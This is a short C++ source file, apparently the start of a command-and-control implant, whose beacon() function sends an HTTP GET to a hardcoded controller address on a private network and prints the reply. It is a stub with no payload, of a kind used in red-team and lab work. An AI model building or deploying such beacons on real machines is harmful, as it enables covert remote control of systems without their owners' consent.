#include "implant.h"
#include "xhttp.h"

#include <iostream>

// Use messagepack when sending data
// https://github.com/msgpack/msgpack-c/tree/cpp_master

namespace implant {

std::string beacon() {
    std::string url = "http://192.168.1.147:8443/";
    std::string response = xhttp::http_get(url);
    std::cout << response << std::endl;
    return response;
}

}